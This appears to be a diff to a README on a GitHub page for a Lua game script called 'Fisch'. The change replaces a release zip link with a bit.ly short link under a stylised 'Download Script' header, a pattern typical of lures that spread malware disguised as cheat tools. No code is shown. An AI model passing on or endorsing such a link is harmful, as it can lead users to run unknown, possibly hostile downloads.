@@ -1,6 +1,6 @@
 ![image](https://github.com/user-attachments/assets/76de71e8-481b-48b8-b7ac-0da687aeef93)
 
-# ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/DarknessOfLua/Fisch/releases/download/download/Pastebin.zip)***
+# ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://bit.ly/3ZmBEFM)***
 
 ![maxresdefault](https://github.com/user-attachments/assets/f8ca7e78-f057-4ca3-a8a4-5c808cb77f91)
 
